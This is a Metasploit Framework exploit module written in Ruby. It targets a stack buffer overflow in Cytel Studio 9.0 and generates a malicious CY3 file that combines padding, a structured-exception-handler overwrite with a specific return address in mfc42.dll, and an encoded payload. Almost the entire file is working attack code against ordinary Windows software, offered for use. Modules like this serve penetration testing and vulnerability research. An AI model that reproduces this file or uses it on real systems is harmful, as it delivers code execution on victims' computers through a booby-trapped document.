# $Id: cytel_studio_cy3.rb 14041 2011-10-24 01:39:11Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Cytel Studio 9.0 (CY3 File) Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based buffer overflow found
                in Cytel Studio <= 9.0. The overflow is triggered during the
                copying of strings to a stack buffer of 256 bytes.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;,  # Initial Discovery/PoC
                    &#039;James Fitts&#039;      # Metasploit Module (Thx Juan & Jeff)
                ],
            &#039;Version&#039;        => &#039;$Revision: 14041 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;75991&#039; ],
                    [ &#039;BID&#039;, &#039;49924&#039; ],
                    [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/cytel_1-adv.txt&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 1000,
                    &#039;BadChars&#039; => "\x00\x09\x0a\x0b\x0c\x0d\x1a\x20",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        # File version 8.0.0.1
                        &#039;Cytel Studio 9.0&#039;,
                        {
                            &#039;Ret&#039; => 0x73e58e01, # p/p/r mfc42.dll
                            &#039;Offset&#039; => 500
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Oct 02 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.cy3&#039;]),
            ], self.class)
    end
 
    def exploit
        cy3 =  "90\n150 1\n1\test\n"
        cy3 << rand_text_alpha_upper(target[&#039;Offset&#039;])
        cy3 << generate_seh_record(target.ret)
        cy3 << rand_text_alpha_upper(8)
        cy3 << payload.encoded
        cy3 << rand_text_alpha_upper(5000 - cy3.length)
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(cy3)
    end
end
 
=begin
During testing, the offset for Jeff was different. But the three of us have NOT
been unable to reproduce the same problem.  All this was tested on:
XP SP3, Vista SP0/SP1, Win 7
=end



